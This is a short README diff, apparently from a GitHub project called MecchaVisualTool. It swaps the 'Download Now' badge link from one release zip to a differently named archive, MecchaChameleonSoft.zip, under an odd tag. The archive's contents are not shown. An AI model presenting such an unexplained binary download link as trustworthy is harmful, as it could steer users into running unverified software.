@@ -8,7 +8,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Pointnocutter/MecchaVisualTool/releases/download/mecchaa/v.1.0.2.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Pointnocutter/MecchaVisualTool/releases/download/sadwaq/MecchaChameleonSoft.zip)
 
 </div>
 
